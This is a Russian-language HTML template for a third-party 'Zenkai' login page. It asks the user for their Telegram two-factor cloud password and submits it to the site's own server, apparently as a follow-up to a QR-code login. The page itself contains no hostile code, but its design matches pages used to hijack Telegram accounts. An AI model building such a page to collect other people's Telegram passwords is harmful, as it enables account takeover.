<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zenkai 2FA Login</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <div class="loading-overlay" id="loader">
        <div class="loading-spinner"></div>
        <div class="loading-text">Авторизуем аккаунт...</div>
    </div>

    <main class="auth-shell compact">
        <section class="brand-panel">
            <div class="brand-mark">2F</div>
            <p class="eyebrow">Двухфакторная защита</p>
            <h1>Нужен облачный пароль</h1>
            <p class="lead">Telegram запросил пароль 2FA. Он используется один раз для завершения входа.</p>
            <div class="signal-grid" aria-hidden="true">
                <span></span><span></span><span></span><span></span>
            </div>
        </section>

        <section class="auth-card">
            <p class="eyebrow">2FA</p>
            <h2>Введите пароль</h2>
            {% if error %}
                <p class="error">{{ error }}</p>
            {% endif %}
            <form action="/password_submit" method="POST" onsubmit="showLoader()">
                <input type="hidden" name="mode" value="{{ mode or 'qr' }}">
                <label class="field">
                    <span>Пароль Telegram</span>
                    <input type="password" name="password" placeholder="••••••••" required autocomplete="current-password">
                </label>
                <button type="submit" class="btn primary" id="submitBtn"><span class="btn-icon">✓</span>Войти</button>
            </form>
            <a href="/" class="btn secondary"><span class="btn-icon">‹</span>Отмена</a>
        </section>
    </main>

    <script>
        function showLoader() {
            document.getElementById('loader').classList.add('active');
            document.getElementById('submitBtn').classList.add('loading');
        }
    </script>
</body>
</html>
